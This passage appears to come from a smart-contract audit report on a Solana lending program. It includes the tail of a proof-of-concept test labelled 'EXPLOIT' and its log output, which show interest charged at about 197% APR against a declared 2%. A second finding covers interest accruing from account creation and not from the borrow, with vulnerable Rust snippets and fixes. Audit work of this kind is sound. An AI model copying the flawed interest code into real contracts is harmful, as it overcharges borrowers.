  const slotAfter = await provider.connection.getSlot();
  const slotsElapsed = slotAfter - slotBefore;

  console.log("[LOG] Actual slots elapsed:", slotsElapsed);

  // ── Trigger interest accrual via repay(1) ────────────────────────────────
  // Repays 1 raw token unit. The interest block fires first, inflating
  // borrowed_amount. market.total_borrows is only reduced by 1 — no underflow.
  await program.methods
    .repay(new anchor.BN(1), new anchor.BN(1))
    .accounts({
      market,
      supplyVault,
      userDeposit: iuDeposit,
      supplyMint: usdcMint,
      collateralMint: ethMint,
      userSupplyAccount: iuUsdcAccount,
      user: interestUser.publicKey,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([interestUser])
    .rpc();

  // FETCH THE UPDATED ACCOUNT STATE IMMEDIATELY
  const depositAfterRepay = await program.account.userDeposit.fetch(iuDeposit);

  // THE FIX: The program itself tells us what slot it used for the calculation
  const exactEndSlot = depositAfterRepay.lastUpdateSlot.toNumber();
  const actualSlotsElapsed = exactEndSlot - slotBefore;
  console.log(
    "[LOG] Actual slots elapsed (From Program State):",
    actualSlotsElapsed,
  );
  const debtAfterRepay = depositAfterRepay.borrowedAmount;

  // interest = (principal + interest - 1) - (principal - 1)
  const actualInterest = debtAfterRepay.sub(
    borrowedPrincipal.sub(new anchor.BN(1)),
  );

  console.log(
    "[LOG] Actual interest charged (USDC):",
    Number(actualInterest) / 1e6,
  );

  // ── Compute expected values ───────────────────────────────────────────────
  const SCALING_FACTOR = new anchor.BN(1_000_000_000);
  const INCORRECT_RATE = new anchor.BN(25);
  const CORRECT_SLOTS_PER_YEAR = new anchor.BN(78_894_000);
  const CORRECT_RATE = new anchor.BN(20_000_000).div(CORRECT_SLOTS_PER_YEAR); // → 0n

  const slotsElapsedBig = new anchor.BN(slotsElapsed);
  const expectedIncorrectInterest = borrowedPrincipal
    .mul(INCORRECT_RATE)
    .mul(slotsElapsedBig)
    .div(SCALING_FACTOR);
  const expectedCorrectInterest = borrowedPrincipal
    .mul(CORRECT_RATE)
    .mul(slotsElapsedBig)
    .div(SCALING_FACTOR);

  console.log(
    "[LOG] Expected interest (INCORRECT  formula):",
    Number(expectedIncorrectInterest) / 1e6,
    "USDC",
  );
  console.log(
    "[LOG] Expected interest (CORRECT formula):",
    Number(expectedCorrectInterest) / 1e6,
    "USDC",
  );

  const impliedAPR =
    (Number(actualInterest) / Number(borrowedPrincipal)) *
    (Number(CORRECT_SLOTS_PER_YEAR) / actualSlotsElapsed) *
    100;

  console.log(`[LOG] Implied APR: ${impliedAPR.toFixed(1)}%`);
  console.log(`[LOG] Overcharge factor: ${(impliedAPR / 2).toFixed(1)}×`);

  // ── Assertions ────────────────────────────────────────────────────────────
  // 1. Actual interest matches the incorrect formula (within ±1 raw unit)
  expect(
    Math.abs(Number(actualInterest.sub(expectedIncorrectInterest))),
  ).to.be.lessThan(1000);

  // 2. Interest is non-zero (the incorrect rate fires)
  expect(actualInterest.toNumber()).to.be.greaterThan(
    new anchor.BN(0).toNumber(),
  );

  // 3. Implied APR is drastically above the declared 2%
  expect(impliedAPR).to.be.greaterThan(100);
});
```

### Output:

```bash
[LOG] Slot before borrow: 57
[LOG] Borrowed principal (raw): 100000000
Advancing ~50 slots...
[LOG] Actual slots elapsed: 51
[LOG] Actual slots elapsed (From Program State): 52
[LOG] Actual interest charged (USDC): 0.00013
[LOG] Expected interest (INCORRECT  formula): 0.000127 USDC
[LOG] Expected interest (CORRECT formula): 0 USDC
[LOG] Implied APR: 197.2%
[LOG] Overcharge factor: 98.6×
    ✔ EXPLOIT: Interest rate inflation due to incorrect slots_per_year used for interest calculation causes protocol to charge 197.2% interest instead of 2% (26771ms)
```

</details>

**Recommendation**:

- Correcting the slot constant by correctly calculating:
  - `0.02 × 1_000_000_000 / 78_894_000 = 0.253`
    - This now truncates to 0, so additional measures need to be taken for interest calculation correction
- Other approach, would be to adjust calculation of interest for accrual per epoch

---

## Borrowers are charged interest from the time of account initialization, instead of being charged from borrowal time

**Severity**: High

**Location**: `borrow.rs:90-116, repay.rs:19-37, user_deposit.rs:79`

**Description**:
The protocol initializes the `user_deposit.last_update_slot` when the account is created.

```rust
// user_deposit.rs
let user_deposit_data = UserDeposit {
        user: ctx.accounts.user.key(),
        market: ctx.accounts.market.key(),
        supply_deposited: 0,
        collateral_deposited: 0,
        borrowed_amount: 0,
        ctoken_balance: 0,
        last_update_slot: Clock::get()?.slot, // @audit-note slot is init here
        bump,
    };
```

Apart from this, the slots are only ever changed in the `borrow()` and `repay()` functions, where interest is calculated based on the delta between the `current_slot` and `user_deposit.last_update_slot` (before updating).

Now consider this.

- invoke user_deposit.rs::initialize_user_deposit() >>>> user's account is initialized at slot 1000 (last_update_slot)
  - `last_update_slot=1000`
- invoke borrow,
  - `slot now = 10,000`
- `slot_elapsed = 10,000 - 1000 = 9,000`
- `interest increment = borrowed amount * interest rate per slot * (9,000)`

```rust
        let slots_elapsed = current_slot.saturating_sub(user_deposit.last_update_slot);
        let interest_rate_per_slot = 25u128; // ~2% annual / 800,000 slots
        let slots_elapsed_u128 = slots_elapsed as u128;
        let interest_increment = user_deposit
            .borrowed_amount
            .saturating_mul(interest_rate_per_slot)
            .saturating_mul(slots_elapsed_u128)
            / SCALING_FACTOR; // Scale down

        user_deposit.borrowed_amount = user_deposit
            .borrowed_amount
            .saturating_add(interest_increment);
```

The user didn't take a loan in slot 1000, but only the `user_deposit` account was initialized.

**Impact**:
User is charged for the duration between current slot and the slot when user_deposit account was initialized (current slot - init slot), instead of the actual loan period.

**Recommendation**:
In the `borrow` function, if the existing `borrowed_amount` is 0, the `last_update_slot` should be force updated to the `current_slot` before any interest calculation, effectively starting the clock only when the funds are disbursed.

```rust
if user_deposit.borrowed_amount == 0 {
    user_deposit.last_update_slot = current_slot;
}
```

---
